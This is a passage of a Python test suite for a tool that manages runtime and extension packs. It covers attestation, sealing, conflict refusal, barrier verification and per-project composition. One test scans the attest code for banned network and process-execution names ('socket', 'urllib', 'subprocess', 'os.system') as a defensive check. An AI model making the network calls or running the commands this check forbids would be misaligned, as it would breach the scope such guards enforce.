        self.assertEqual(self.eff("fakecli", "mcp"), "no")
        rc, out, err = self.q("attest", "fakecli", "mcp", *self.words, "--plan", tok, "--approved", "go on")
        self.assertEqual(rc, 0, err)
        rec = jread(os.path.join(self.state, "providers", "fakecli", "verified.json"))["mcp"]
        self.assertEqual((rec["by"], rec["cost_cents"], rec["cleanup"], rec["approved"], rec["hash"]),
                         ("attest", 0, "scratch dir removed", "go on", P.definition_hash("fakecli")))
        self.assertEqual(self.eff("fakecli", "mcp"), "yes")
        with open(os.path.join(self.state, "audit.log")) as f:
            self.assertEqual(json.loads(f.readlines()[-1])["verb"], "provider:attest")

    def test_a_failed_check_proves_nothing_and_removes_an_earlier_record(self):
        self.apply("attest", "fakecli", "mcp", *self.words)
        self.assertEqual(self.eff("fakecli", "mcp"), "yes")
        fail = list(self.words)
        fail[fail.index("pass")] = "fail"
        self.apply("attest", "fakecli", "mcp", *fail)
        self.assertEqual(self.eff("fakecli", "mcp"), "no")

    def test_an_attest_goes_stale_with_an_edit_of_the_content(self):
        self.apply("attest", "fakecli", "mcp", *self.words)
        self.assertEqual(self.eff("fakecli", "mcp"), "yes")
        p = os.path.join(self.lib, "fakecli", "definition.json")
        d = jread(p); d["description"] = "edited"; jwrite(p, d)
        self.apply("seal", "fakecli")
        self.assertEqual(self.eff("fakecli", "mcp"), "no")

    def test_it_refuses_what_it_cannot_bind(self):
        for args, rc in ((("fakecli", "resume"), 1), (("fakecli", "nosuchcap"), 1), (("claude-code", "skills"), 2), (("nopack", "mcp"), 1)):
            self.assertEqual(self.q("attest", *args, *self.words)[0], rc, args)
        self.apply("new", "scratch")
        self.assertEqual(self.q("attest", "scratch", "mcp", *self.words)[0], 2)         # an unsealed pack
        self.assertEqual(self.q("attest", "fakecli", "mcp", "--asked", "x", "--did", "y", "--result", "maybe", "--cost-cents", "0", "--cleanup", "z")[0], 2)
        self.assertEqual(self.q("attest", "fakecli", "mcp", "--asked", "x", "--did", "y", "--result", "pass", "--cost-cents", "-3", "--cleanup", "z")[0], 2)

    def test_it_makes_no_network_call_and_runs_no_command(self):
        src = fread(os.path.join(HERE, "..", "lib", "conformance", "library.py"))
        body = src[src.index("def cmd_attest"):src.index("# ---- list, show for the packs")]
        for banned in ("subprocess", "socket", "urllib", "requests", "http.client", "os.system", "Popen"):
            self.assertNotIn(banned, body)


class RemoveEnable(LibraryBase):
    def setUp(self):
        super().setUp()
        self.import_pack(self.source())
        os.makedirs(os.path.join(self.conf, "projects"))
        self.project("alpha", {"models": {"provider": {"local": "fakecli"}}})
        ext = self.source("addon", {"schema": 2, "kind": "extension", "extension": "addon", "extends": "fakecli", "provides": ["resume"],
                                    "adds": {"capabilities": {"resume": cell("yes")}, "adapter_verbs": {"resume": "verbs/resume"}}},
                          files={"verbs/resume": "#!/bin/sh\necho {}\n"}, execs=("verbs/resume",))
        self.import_pack(ext, exec_names="verbs/resume")

    def project(self, name, answers):
        """Answers `qargi project set` accepts (a valid project), with the models of `answers`."""
        base = {"schema": 1, "project": name, "repo": {"url": "https://example.invalid/r.git", "path": "", "credential_file": "", "long_lived": ["master"]},
                "roles": {"build": {"base": "@dispatcher", "push": {"mode": "none"}, "model": "claude-sonnet-5-5", "effort": "high", "apt": [], "skills": []}},
                "models": {}, "memory": {"memory_store": "", "reference_store": "", "tiers": {}}, "budget_cents": 500}
        base["models"] = answers.get("models", {})
        with open(os.path.join(self.conf, "projects", name + ".json"), "w") as f:
            json.dump(base, f)

    def answers(self, name="alpha"):
        return jread(os.path.join(self.conf, "projects", name + ".json"))

    def test_remove_is_refused_while_a_project_runs_it(self):
        rc, _, err = self.q("remove", "fakecli")
        self.assertEqual(rc, 1)
        self.assertIn("project alpha runs it", err)
        self.assertTrue(self.stored("fakecli"))

    def test_remove_is_refused_while_an_extension_extends_it_or_a_runtime_takes_its_models(self):
        self.project("alpha", {"models": {"provider": {"local": "other"}}})
        rc, _, err = self.q("remove", "fakecli")
        self.assertEqual(rc, 1)
        self.assertIn("extension addon extends it", err)
        self.import_pack(self.source("famcat", catalog("famcat")))
        d = fake_runtime("usesit", models={"catalog": "famcat", "use": "id"})
        self.import_pack(self.source("usesit", d))
        rc, _, err = self.q("remove", "famcat")
        self.assertEqual(rc, 1)
        self.assertIn("runtime usesit takes its models from it", err)

    def test_remove_is_a_plan_then_removes_the_pack_and_its_verification(self):
        self.project("alpha", {"models": {"provider": {"local": "other"}}})
        self.q("remove", "addon")                                                    # plan only
        self.assertTrue(self.stored("addon"))
        self.apply("remove", "addon")
        self.assertFalse(self.stored("addon"))
        P.record_verification("fakecli", {"skills": {"hash": "h", "by": "conformance", "at": "t", "note": ""}})
        self.assertTrue(os.path.isdir(os.path.join(self.state, "providers", "fakecli")))
        self.project("alpha", {"models": {}})
        self.apply("remove", "fakecli")
        self.assertFalse(self.stored("fakecli"))
        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "fakecli")))
        with open(os.path.join(self.state, "audit.log")) as f:
            self.assertEqual([json.loads(ln)["verb"] for ln in f if '"provider:remove"' in ln], ["provider:remove", "provider:remove"])
        rc, out, err = self.q("remove", "claude-code")
        self.assertEqual(rc, 2)
        self.assertIn("shipped with qargi", err)

    def test_enable_is_its_own_plan_names_the_executables_and_records_the_extension(self):
        rc, out, err = self.q("enable", "alpha", "addon")
        self.assertEqual(rc, 0, err)
        self.assertIn("verbs/resume  sha256", out)
        self.assertIn("models.extensions of project alpha becomes [\"addon\"]", out)
        self.assertEqual(self.answers()["models"].get("extensions"), None)
        tok = self.token(out)
        rc, _, err = self.q("enable", "alpha", "addon", "--plan", tok, "--approved", "go")
        self.assertEqual(rc, 1)
        self.assertIn("does not name: verbs/resume", err)
        rc, out, err = self.q("enable", "alpha", "addon", "--plan", tok, "--approved", "go", "--approve-exec", "verbs/resume")
        self.assertEqual(rc, 0, err)
        self.assertEqual(self.answers()["models"]["extensions"], ["addon"])
        self.assertIn("nothing to do", self.q("enable", "alpha", "addon")[1])
        self.apply("disable", "alpha", "addon")
        self.assertEqual(self.answers()["models"]["extensions"], [])
        self.assertIn("nothing to do", self.q("disable", "alpha", "addon")[1])

    def test_enable_refuses_what_is_not_sealed_not_an_extension_or_not_for_the_projects_runtime(self):
        self.assertEqual(self.q("enable", "alpha", "fakecli")[0], 1)
        self.assertEqual(self.q("enable", "nosuch", "addon")[0], 1)
        self.assertEqual(self.q("enable", "alpha", "claude")[0], 1)
        self.project("beta", {"models": {"provider": {"local": "claude-code"}}})
        rc, _, err = self.q("enable", "beta", "addon")
        self.assertEqual(rc, 2)
        self.assertIn("extends fakecli; project beta runs claude, claude-code", err)
        p = os.path.join(self.lib, "addon", "definition.json")
        d = jread(p); d["description"] = "edited"; jwrite(p, d)
        rc, _, err = self.q("enable", "alpha", "addon")
        self.assertEqual(rc, 2)
        self.assertIn("changed since it was sealed", err)

    def test_an_extension_that_does_not_provide_what_it_adds_is_refused(self):
        bad = {"schema": 2, "kind": "extension", "extension": "badext", "extends": "fakecli", "provides": ["resume", "mcp"], "adds": {"capabilities": {"resume": cell("yes")}}}
        rc, out, _ = self.q("import", self.source("badext", bad))
        self.assertEqual(rc, 1)
        self.assertIn("FAIL: provides must equal the capability names of adds.capabilities", out)


# ---- extensions: composition with provenance, conflicts, per-capability verification, per surface ---------------------------------

def skill_ext(name="skillext", extends="plaincli", **over):
    """An extension that gives a runtime without skills the skills resource, and claims the capability (a hermetic case backs it)."""
    d = {"schema": 2, "kind": "extension", "extension": name, "description": "adds skills", "extends": extends, "provides": ["skills"],
         "adds": {"capabilities": {"skills": {"value": "yes", "note": "n"}}, "resources": copy.deepcopy(SKILLS_RES)}}
    d.update(over)
    return d


def cap_ext(name, extends, caps, **over):
    """An extension that adds capabilities only (cells without a hermetic case)."""
    d = {"schema": 2, "kind": "extension", "extension": name, "description": name, "extends": extends, "provides": sorted(caps),
         "adds": {"capabilities": {c: {"value": "yes", "note": "n"} for c in caps}}}
    d.update(over)
    return d


class ExtensionBase(LibraryBase):
    def setUp(self):
        super().setUp()
        os.makedirs(os.path.join(self.conf, "projects"))

    def project(self, name, models):
        base = {"schema": 1, "project": name, "repo": {"url": "https://example.invalid/r.git", "path": "", "credential_file": "", "long_lived": ["master"]},
                "roles": {"build": {"base": "@dispatcher", "push": {"mode": "none"}, "model": "claude-sonnet-5-5", "effort": "high", "apt": [], "skills": []}},
                "models": models, "memory": {"memory_store": "", "reference_store": "", "tiers": {}}, "budget_cents": 500}
        with open(os.path.join(self.conf, "projects", name + ".json"), "w") as f:
            json.dump(base, f)

    def answers(self, name="alpha"):
        return jread(os.path.join(self.conf, "projects", name + ".json"))

    def put(self, name, doc, exec_names=None, **kw):
        self.import_pack(self.source(name, doc, **kw), exec_names=exec_names)

    def edit(self, name, mutate):
        p = os.path.join(self.lib, name, "definition.json")
        d = jread(p)
        mutate(d)
        jwrite(p, d)
        self.apply("seal", name)

    def eff_for(self, name="plaincli", surface="local", cap="skills", project="alpha"):
        return P.effective(name, surface, cap, project=project)


class Extensions(ExtensionBase):
    def setUp(self):
        super().setUp()
        self.put("plaincli", runtime("plaincli", capabilities={"mcp": {"value": "yes", "note": "m"}}))
        self.put("skillext", skill_ext())
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["skillext"]})

    def test_the_composition_records_which_pack_provided_each_capability(self):
        comp = P.compose("plaincli", "local", project="alpha")
        d = comp["definition"]
        self.assertEqual(sorted(d["capabilities"]), ["mcp", "skills"])
        self.assertEqual(comp["provenance"]["capabilities.mcp"], "plaincli")
        self.assertEqual(comp["provenance"]["capabilities.skills"], "skillext")
        self.assertEqual(comp["provenance"]["resources.skills"], "skillext")
        self.assertEqual(d["resources"]["skills"]["project_dir"], ".fake/skills")
        self.assertEqual((comp["extensions"], comp["ignored"]), (["skillext"], []))
        base = P.definition("plaincli", "local")                                   # the base is not touched
        self.assertNotIn("skills", base["capabilities"])
        self.assertNotIn("skills", base["resources"])
        none = P.compose("plaincli", "local")                                      # no project, no extensions
        self.assertEqual((none["extensions"], sorted(none["definition"]["capabilities"])), ([], ["mcp"]))

    def test_extensions_are_merged_in_name_order_and_all_recorded(self):
        self.put("aaext", cap_ext("aaext", "plaincli", ["resume"], adds={"capabilities": {"resume": {"value": "yes", "note": "n"}}, "adapter_verbs": {"resume": "verbs/resume"}}),
                 files={"verbs/resume": "#!/bin/sh\necho {}\n"}, execs=("verbs/resume",), exec_names="verbs/resume")
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["skillext", "aaext"]})
        comp = P.compose("plaincli", "local", project="alpha")
        self.assertEqual(comp["extensions"], ["aaext", "skillext"])
        self.assertEqual(comp["provenance"]["adapter_verbs.resume"], "aaext")
        self.assertEqual(comp["definition"]["extension_verbs"], {"resume": {"pack": "aaext", "path": "verbs/resume"}})

    def test_show_with_a_project_prints_the_composed_view_with_provenance(self):
        rc, out, err = self.q("show", "plaincli", "--project", "alpha")
        self.assertEqual(rc, 0, err)
        self.assertRegex(out, r"mcp +yes .*\[plaincli\]")
        self.assertRegex(out, r"skills +yes .*\[skillext\]")
        self.assertIn("composed for project alpha", out)
        self.assertRegex(out, r"skillext +applied")
        rc, out, _ = self.q("show", "plaincli")                                    # without a project: the runtime alone
        self.assertNotIn("skills", out.split("capabilities")[1])
        rc, out, _ = self.q("show", "plaincli", "--project", "alpha", "--json")
        j = json.loads(out)
        self.assertEqual(j["provenance"]["capabilities.skills"], "skillext")
        self.assertEqual(j["extensions"], ["skillext"])
        rc, out, _ = self.q("show", "plaincli", "--project", "nosuch")
        self.assertEqual(rc, 0)
        self.assertNotIn("composed for", out)

    def test_an_extension_capability_counts_only_after_check_of_that_extension(self):
        self.assertEqual(P.cap("plaincli", "local", "skills", project="alpha"), "unverified")
        self.assertEqual(self.eff_for(), "no")
        self.assertEqual(self.q("effective", "plaincli", "local", "skills", "--project", "alpha")[1].strip(), "no")
        rc, out, err = self.q("check", "skillext", "--project", "alpha")
        self.assertEqual(rc, 0, (out, err))
        self.assertIn("ok   link-skills", out)
        self.assertIn("skills                             verified (cases link-skills)", out)
        self.assertIn("recorded 1 verification", out)
        rec = jread(os.path.join(self.state, "providers", "skillext", "verified.json"))
        self.assertEqual(list(rec), ["skills"])
        self.assertEqual((rec["skills"]["by"], rec["skills"]["hash"]), ("conformance", P.extension_hash("skillext", "plaincli", "local")))
        self.assertEqual(self.eff_for(), "yes")
        self.assertEqual(self.q("effective", "plaincli", "local", "skills", "--project", "alpha")[1].strip(), "yes")
        self.assertEqual(P.effective("plaincli", "local", "skills"), "no")        # the runtime alone has no skills
        self.assertEqual(self.eff_for(cap="mcp"), "no")                            # the base's own claim is still unverified
        self.assertEqual(self.q("show", "plaincli", "--project", "alpha")[1].count("verified by conformance"), 1)
        self.project("alpha", {"provider": {"local": "plaincli"}})                 # disabled: back to no
        self.assertEqual(self.eff_for(), "no")

    def test_check_without_a_project_binds_to_the_runtime_the_extension_names(self):
        rc, out, err = self.q("check", "skillext")
        self.assertEqual(rc, 0, (out, err))
        self.assertEqual(self.eff_for(), "yes")

    def test_a_changed_extension_or_a_resealed_base_demotes_what_was_verified(self):
        self.q("check", "skillext")
        self.assertEqual(self.eff_for(), "yes")
        self.edit("skillext", lambda d: d.update(description="edited"))
        self.assertEqual(self.eff_for(), "no")
        self.assertIn("record is stale, counts as no", self.q("show", "plaincli", "--project", "alpha")[1])
        self.q("check", "skillext")
        self.assertEqual(self.eff_for(), "yes")
        self.edit("plaincli", lambda d: d.update(description="edited base"))       # the hash chain: a base reseal makes the extension's verification STALE
        self.assertEqual(self.eff_for(), "no")
        self.q("check", "skillext")
        self.assertEqual(self.eff_for(), "yes")

    def test_a_record_with_another_verifier_or_a_wrong_hash_is_no_record(self):
        os.makedirs(os.path.join(self.state, "providers", "skillext"))
        f = os.path.join(self.state, "providers", "skillext", "verified.json")
        h = P.extension_hash("skillext", "plaincli", "local")
        for rec in ({"hash": "0" * 64, "by": "conformance"}, {"hash": h, "by": "me"}, {"hash": h}, {"hash": P.definition_hash("plaincli"), "by": "attest"}):
            jwrite(f, {"skills": rec})
            self.assertEqual(self.eff_for(), "no", rec)

    def test_an_extension_for_another_surface_or_runtime_is_ignored(self):
        self.put("cloudrt", runtime("cloudrt", surface="cloud"))
        self.project("alpha", {"provider": {"local": "plaincli", "cloud": "cloudrt"}, "extensions": ["skillext"]})
        self.q("check", "skillext")
        self.assertEqual(self.eff_for(), "yes")
        comp = P.compose("cloudrt", "cloud", project="alpha")
        self.assertEqual(comp["extensions"], [])
        self.assertEqual([i["extension"] for i in comp["ignored"]], ["skillext"])
        self.assertIn("extends plaincli", comp["ignored"][0]["why"])
        self.assertEqual(self.eff_for("cloudrt", "cloud"), "no")
        self.assertEqual(self.eff_for("plaincli", "cloud"), "no")                    # plaincli does not serve cloud
        # a family extension names its surface: it applies to the runtime of the family on that surface only
        self.put("fama", runtime("fama", family="fam"))
        self.put("famb", runtime("famb", family="fam", surface="cloud"))
        self.put("cloudbit", skill_ext("cloudbit", "fam", surface="cloud"))
        self.project("alpha", {"provider": {"local": "fama", "cloud": "famb"}, "extensions": ["cloudbit"]})
        self.assertEqual(P.compose("fama", "local", project="alpha")["extensions"], [])
        self.assertEqual(P.compose("famb", "cloud", project="alpha")["extensions"], ["cloudbit"])
        self.assertIn("on cloud, not local", P.compose("fama", "local", project="alpha")["ignored"][0]["why"])
        # a project that does not run the runtime on that surface gets no extension on it
        self.project("beta", {"provider": {"local": "fama"}, "extensions": ["cloudbit"]})
        self.assertEqual(P.compose("famb", "cloud", project="beta")["extensions"], [])

    def test_a_family_extension_without_a_surface_applies_nowhere_and_enable_refuses_it(self):
        self.put("fama", runtime("fama", family="fam"))
        self.put("famext", skill_ext("famext", "fam"))
        self.project("beta", {"provider": {"local": "fama"}, "extensions": ["famext"]})
        comp = P.compose("fama", "local", project="beta")
        self.assertEqual(comp["extensions"], [])
        self.assertIn("extends the family fam and names no surface", comp["ignored"][0]["why"])
        self.project("beta", {"provider": {"local": "fama"}})
        rc, out, err = self.q("enable", "beta", "famext")
        self.assertEqual(rc, 2)
        self.assertIn("applies to nothing", err)
        self.assertIn("names no surface", err)

    def test_what_the_extension_requires_must_be_there_or_it_is_ignored_and_says_why(self):
        self.put("needsagents", skill_ext("needsagents", requires={"resources": ["agents"]}))
        self.put("needsmcp", skill_ext("needsmcp", requires={"capabilities": ["mcp"]}))
        self.put("needsnew", skill_ext("needsnew", requires={"qargi": ">=999.0"}))
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["needsagents", "needsmcp", "needsnew"]})
        comp = P.compose("plaincli", "local", project="alpha")
        why = {i["extension"]: i["why"] for i in comp["ignored"]}
        self.assertEqual(comp["extensions"], [])
        self.assertIn("needs the agents resource", why["needsagents"])
        self.assertIn("needs mcp, which plaincli does not have verified", why["needsmcp"])
        self.assertIn("needs qargi >=999.0", why["needsnew"])

    def test_the_barrier_of_an_extension_is_honoured_by_require_barrier_once_verified(self):
        self.put("barext", cap_ext("barext", "plaincli", ["read_only_barrier"], adds={"capabilities": {"read_only_barrier": {"value": "yes", "note": "n"}}, "barrier": {"kind": "sandbox-args"}}))
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["barext"]})
        self.assertEqual(P.require_barrier("plaincli", "local", "alpha")[0], "refused")
        rc, out, _ = self.q("check", "barext", "--project", "alpha")                 # no hermetic case reaches a composed barrier
        self.assertEqual(rc, 0)
        self.assertIn("read_only_barrier                  not verified: could not run", out)
        self.assertEqual(P.require_barrier("plaincli", "local", "alpha")[0], "refused")
        P.record_verification("barext", {"read_only_barrier": {"hash": P.extension_hash("barext", "plaincli", "local"), "by": "attest", "at": "t", "note": ""}})
        self.assertEqual(P.require_barrier("plaincli", "local", "alpha")[0], "yes")
        self.assertEqual(P.require_barrier("plaincli", "local")[0], "refused")       # asked without the project: the runtime alone
        self.assertEqual(self.q("require-barrier", "plaincli", "local", "--project", "alpha")[0], 0)
        self.assertEqual(self.q("require-barrier", "plaincli", "local")[0], 2)

    def test_an_attested_extension_that_only_claims_the_barrier_is_no_barrier_and_the_refusal_names_it(self):
        self.put("claimext", cap_ext("claimext", "plaincli", ["read_only_barrier"]))
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["claimext"]})
        P.record_verification("claimext", {"read_only_barrier": {"hash": P.extension_hash("claimext", "plaincli", "local"), "by": "attest", "at": "t", "note": ""}})
        self.assertEqual(self.eff_for(cap="read_only_barrier"), "no")
        state, text = P.require_barrier("plaincli", "local", "alpha")
        self.assertEqual(state, "refused")
        self.assertIn("claimext", text)
        self.assertIn("barrier.kind is none", text)
        self.assertEqual(self.q("require-barrier", "plaincli", "local", "--project", "alpha")[0], 2)

    def test_attest_binds_an_extension_capability_to_the_extension_and_its_base(self):
        self.put("resext", cap_ext("resext", "plaincli", ["resume"]))
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["resext"]})
        words = ("--asked", "ok", "--did", "ran resume once", "--result", "pass", "--cost-cents", "0", "--cleanup", "nothing left")
        self.assertEqual(self.eff_for(cap="resume"), "no")
        self.apply("attest", "resext", "resume", "--project", "alpha", *words)
        rec = jread(os.path.join(self.state, "providers", "resext", "verified.json"))["resume"]
        self.assertEqual((rec["by"], rec["hash"]), ("attest", P.extension_hash("resext", "plaincli", "local")))
        self.assertEqual(self.eff_for(cap="resume"), "yes")
        self.edit("plaincli", lambda d: d.update(description="edited base"))
        self.assertEqual(self.eff_for(cap="resume"), "no")
        self.assertEqual(self.q("attest", "resext", "skills", "--project", "alpha", *words)[0], 1)    # it does not provide that
        # a check keeps what was attested for the same content and records what it can verify
        self.apply("attest", "resext", "resume", "--project", "alpha", *words)
        self.assertEqual(self.eff_for(cap="resume"), "yes")
        self.q("check", "resext", "--project", "alpha")
        self.assertEqual(self.eff_for(cap="resume"), "yes")

    def test_an_enabled_extension_that_changed_or_is_gone_refuses_the_composition(self):
        p = os.path.join(self.lib, "skillext", "definition.json")
        d = jread(p); d["description"] = "edited"; jwrite(p, d)
        with self.assertRaises(P.Drift):
            P.compose("plaincli", "local", project="alpha")
        self.apply("seal", "skillext")
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["nosuchext"]})
        with self.assertRaises(P.Refused) as cm:
            P.compose("plaincli", "local", project="alpha")
        self.assertIn("nosuchext", str(cm.exception))
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["plaincli"]})        # a runtime is not an extension
        with self.assertRaises(P.Refused):
            P.compose("plaincli", "local", project="alpha")
        rc, _, err = self.q("effective", "plaincli", "local", "skills", "--project", "alpha")
        self.assertEqual(rc, 2)

    def test_an_extension_that_claims_a_barrier_and_adds_none_fails_its_check_on_the_composition(self):
        self.put("clamext", cap_ext("clamext", "plaincli", ["read_only_barrier"]))
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["clamext"]})
        rc, out, _ = self.q("check", "clamext", "--project", "alpha")
        self.assertEqual(rc, 1, out)
        self.assertRegex(out, r"fail: .*read_only_barrier.*clamext.*plaincli.* on local")
        self.assertIn("set barrier.kind", out)
        self.assertIn("declare the capability not supported", out)
        self.assertIn("nothing is verified while the pack fails", out)
        self.assertEqual(P.verification("clamext"), {})
        self.assertEqual(P.effective("plaincli", "local", "read_only_barrier", project="alpha"), "no")

    def test_an_extension_that_claims_a_barrier_and_adds_one_passes_that_check(self):
        self.put("barx", cap_ext("barx", "plaincli", ["read_only_barrier"], adds={"capabilities": {"read_only_barrier": {"value": "yes", "note": "n"}}, "barrier": {"kind": "sandbox-args"}}))
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["barx"]})
        rc, out, _ = self.q("check", "barx", "--project", "alpha")
        self.assertEqual(rc, 0, out)
        self.assertNotIn("fail:", out)


class ExtensionConflicts(ExtensionBase):
    def setUp(self):
        super().setUp()
        self.put("plaincli", runtime("plaincli", capabilities={"mcp": {"value": "yes", "note": "m"}}))

    def enable_list(self, *names):
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": list(names)})

    def refused(self, needle, *names):
        self.enable_list(*names)
        with self.assertRaises(P.Conflict) as cm:
            P.compose("plaincli", "local", project="alpha")
        self.assertIn(needle, str(cm.exception))
        rc, out, err = self.q("show", "plaincli", "--project", "alpha")
        self.assertEqual((rc, out), (2, ""))
        self.assertIn(needle, err)
        rc, out, err = self.q("effective", "plaincli", "local", "skills", "--project", "alpha")
        self.assertEqual(rc, 2)
        self.assertIn(needle, err)
        with self.assertRaises(P.Conflict):
            P.effective("plaincli", "local", "mcp", project="alpha")

    def test_two_extensions_providing_the_same_capability_are_refused_naming_both(self):
        self.put("ext1", skill_ext("ext1"))
        self.put("ext2", skill_ext("ext2"))
        self.refused("extensions ext1 and ext2 both add capabilities.skills", "ext1", "ext2")

    def test_an_extension_colliding_with_a_base_field_is_refused_naming_the_runtime(self):
        self.put("mcpext", cap_ext("mcpext", "plaincli", ["mcp"]))
        self.refused("extension mcpext adds capabilities.mcp, which the runtime plaincli already has", "mcpext")

    def test_a_base_cell_that_says_no_is_not_a_claim_and_the_extension_may_provide_it(self):
        self.put("nocli", runtime("nocli", capabilities={"resume": {"value": "no", "note": "none"}}))
        self.put("resext", cap_ext("resext", "nocli", ["resume"]))
        self.project("alpha", {"provider": {"local": "nocli"}, "extensions": ["resext"]})
        comp = P.compose("nocli", "local", project="alpha")
        self.assertEqual((comp["provenance"]["capabilities.resume"], comp["definition"]["capabilities"]["resume"]["value"]), ("resext", "yes"))

    def test_two_resources_renderers_or_barriers_with_the_same_name_are_refused(self):
        self.put("withskills", runtime("withskills", resources=SKILLS_RES))
        self.put("res1", skill_ext("res1", "withskills"))
        self.project("alpha", {"provider": {"local": "withskills"}, "extensions": ["res1"]})
        with self.assertRaises(P.Conflict) as cm:
            P.compose("withskills", "local", project="alpha")
        self.assertIn("extension res1 adds resources.skills, which the runtime withskills already has", str(cm.exception))
        rend = {"agent": {"engine": "map", "target": "x"}}
        self.put("rend1", cap_ext("rend1", "plaincli", [], adds={"capabilities": {}, "renderers": rend}))
        self.put("rend2", cap_ext("rend2", "plaincli", [], adds={"capabilities": {}, "renderers": rend}))
        self.refused("extensions rend1 and rend2 both add renderers.agent", "rend1", "rend2")
        bar = {"capabilities": {}, "barrier": {"kind": "sandbox-args"}}
        self.put("bar1", cap_ext("bar1", "plaincli", [], adds=bar))
        self.put("bar2", cap_ext("bar2", "plaincli", [], adds=bar))
        self.refused("extensions bar1 and bar2 both add barrier", "bar1", "bar2")

    def test_two_extensions_with_the_same_adapter_verb_are_refused(self):
        for n in ("verb1", "verb2"):
            self.put(n, cap_ext(n, "plaincli", [], adds={"capabilities": {}, "adapter_verbs": {"status": "v/status"}}), files={"v/status": "#!/bin/sh\necho {}\n"},
                     execs=("v/status",), exec_names="v/status")
        self.refused("extensions verb1 and verb2 both add adapter_verbs.status", "verb1", "verb2")

    def test_a_verb_the_base_adapter_serves_is_refused_and_one_it_does_not_is_added(self):
        self.put("adaptcli", runtime("adaptcli", adapter="adapter", adapter_verbs=["resolve", "start-session"]), files={"adapter": "#!/bin/sh\necho {}\n"},
                 execs=("adapter",), exec_names="adapter")
        for n, verb in (("takes", "resolve"), ("adds", "status")):
            self.put(n, cap_ext(n, "adaptcli", [], adds={"capabilities": {}, "adapter_verbs": {verb: "v/x"}}), files={"v/x": "#!/bin/sh\necho {}\n"}, execs=("v/x",), exec_names="v/x")
        self.project("alpha", {"provider": {"local": "adaptcli"}, "extensions": ["takes"]})
        with self.assertRaises(P.Conflict) as cm:
            P.compose("adaptcli", "local", project="alpha")
        self.assertIn("extension takes adds adapter_verbs.resolve, which the runtime adaptcli already has", str(cm.exception))
        self.project("alpha", {"provider": {"local": "adaptcli"}, "extensions": ["adds"]})
        self.assertEqual(P.compose("adaptcli", "local", project="alpha")["provenance"]["adapter_verbs.status"], "adds")
        # an adapter that names no verbs serves every verb of the contract
        self.put("allcli", runtime("allcli", adapter="adapter"), files={"adapter": "#!/bin/sh\necho {}\n"}, execs=("adapter",), exec_names="adapter")
        self.put("takes2", cap_ext("takes2", "allcli", [], adds={"capabilities": {}, "adapter_verbs": {"collect": "v/x"}}), files={"v/x": "#!/bin/sh\necho {}\n"}, execs=("v/x",), exec_names="v/x")
        self.project("alpha", {"provider": {"local": "allcli"}, "extensions": ["takes2"]})
        with self.assertRaises(P.Conflict):
            P.compose("allcli", "local", project="alpha")

    def test_enable_refuses_an_extension_that_conflicts_with_the_enabled_ones_and_changes_nothing(self):
        self.put("ext1", skill_ext("ext1"))
        self.put("ext2", skill_ext("ext2"))
        self.enable_list()
        self.apply("enable", "alpha", "ext1")
        self.assertEqual(self.answers()["models"]["extensions"], ["ext1"])
        rc, out, err = self.q("enable", "alpha", "ext2")
        self.assertEqual(rc, 2)
        self.assertIn("extensions ext1 and ext2 both add capabilities.skills", err)
        self.assertEqual(self.answers()["models"]["extensions"], ["ext1"])
        self.put("mcpext", cap_ext("mcpext", "plaincli", ["mcp"]))
        rc, _, err = self.q("enable", "alpha", "mcpext")
        self.assertEqual(rc, 2)
        self.assertIn("which the runtime plaincli already has", err)

    def test_checking_an_extension_that_collides_with_its_base_fails_and_records_nothing(self):
        self.put("mcpext", cap_ext("mcpext", "plaincli", ["mcp"]))
        rc, out, err = self.q("check", "mcpext")
        self.assertEqual(rc, 1)
        self.assertIn("which the runtime plaincli already has", out + err)
        self.assertFalse(os.path.exists(os.path.join(self.state, "providers", "mcpext", "verified.json")))


class ProjectConsumers(ExtensionBase):
    """What acts for a PROJECT reads the runtime composed with the extensions the project enabled: layout, require, require-skills and
    launch with project=, and the adapter and the exec copies of a library runtime found by lib/provider.py instead of by path."""

    def setUp(self):
        super().setUp()
        self.put("plaincli", runtime("plaincli", capabilities={"mcp": {"value": "yes", "note": "m"}}))
        self.put("skillext", skill_ext())
        self.project("alpha", {"provider": {"local": "plaincli"}, "extensions": ["skillext"]})
        self.project("beta", {"provider": {"local": "plaincli"}})

    def run_p(self, *args, data=None, tmpdir=None):
        env = dict(self.env, TMPDIR=tmpdir) if tmpdir else self.env
        r = subprocess.run([sys.executable, "-I", os.path.join(LIB, "provider.py")] + list(args), capture_output=True, text=True, env=env,
                           input=data if data is not None else "", cwd=self.tmp)
        return r.returncode, r.stdout, r.stderr

    def test_composed_is_the_definition_without_a_project_and_the_merged_one_with_it(self):
        self.assertEqual(P.composed("plaincli", "local"), P.definition("plaincli", "local"))
        self.assertEqual(P.composed("plaincli", "local", "beta"), P.definition("plaincli", "local"))     # a project that enabled none
        self.assertEqual(P.composed("plaincli", "local", "alpha")["resources"]["skills"]["project_dir"], ".fake/skills")
        self.assertEqual(P.composed("plaincli", "local", "alpha"), P.compose("plaincli", "local", project="alpha")["definition"])
        self.assertNotIn("skills", P.definition("plaincli", "local")["resources"])                      # the base is not touched

    def test_the_layout_of_a_project_has_the_resources_an_extension_adds(self):
        self.assertIsNone(P.layout("plaincli")["project_skills_dir"])
        self.assertIsNone(P.layout("plaincli", project="beta")["project_skills_dir"])
        self.assertEqual(P.layout("plaincli", project="alpha")["project_skills_dir"], ".fake/skills")
        self.assertEqual(P.require("plaincli", "project_skills_dir", "x", project="alpha"), ".fake/skills")
        for project in (None, "beta"):
            with self.assertRaises(P.Unsupported):
                P.require("plaincli", "project_skills_dir", "x", project=project)
        rc, out, err = self.run_p("layout", "plaincli", "project_skills_dir", "--project", "alpha")
        self.assertEqual((rc, out.strip()), (0, ".fake/skills"), err)
        self.assertEqual(self.run_p("layout", "plaincli", "project_skills_dir")[0], 3)
        self.assertEqual(self.run_p("layout", "plaincli", "project_skills_dir", "--project", "beta")[0], 3)
